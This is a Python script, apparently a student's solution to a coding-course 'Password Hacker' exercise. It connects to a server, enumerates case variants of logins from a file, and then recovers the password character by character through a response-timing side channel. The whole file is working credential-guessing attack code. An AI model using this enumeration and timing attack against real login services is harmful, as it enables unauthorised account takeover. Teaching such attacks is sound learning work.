# write your code here
import socket
import sys
import itertools
import json
import time


small = ''.join([chr(i) for i in range(97, 123)])
number = '1234567890_'
big = small.upper()

args = sys.argv

# creating the socket
client_socket = socket.socket()
hostname = args[1]
port = int(args[2])
address = (hostname, port)

# connecting to the server
client_socket.connect(address)

# try to find login
with open(r'D:\DATA-3\python-DATA\PassWord Hacker\Password Hacker\task\logins.txt', 'r') as f:
    read_logins = [login.strip('\n') for login in f.readlines()]
j, k = 1, ''
for read_login in read_logins:
    logins = itertools.product(*[i + i.swapcase() if i not in number else i for i in list(read_login)])
    for login in list(logins):
        data = json.dumps(dict(login=''.join(login), password=' '))
        data = data.encode()
        # sending through socket
        client_socket.send(data)
        # receiving the response
        response = client_socket.recv(1024)
        # decoding from bytes to string
        response = json.loads(response.decode())["result"]
        if response == "Wrong password!":
            j, k = 0, ''.join(login)
            break
    if j == 0:
        break
# try to find password
password, j = '', 1
# time_box = []
while True:
    for i in small + big + number:
        data = json.dumps(dict(login=k, password=password + i))
        data = data.encode()
        # sending through socket
        start = time.time()
        client_socket.send(data)
        # receiving the response
        response = client_socket.recv(1024)
        end = time.time()
        # decoding from bytes to string
        response = json.loads(response.decode())["result"]
        # time_box.append(end - start)
        # print(time_box)
        # if response == "Exception happened during login":
        if end - start >= 0.01:
            password += i
            break
        elif response == "Connection success!":
            print(data.decode())
            j = 0
            break
    if j == 0:
        break
#
client_socket.close()
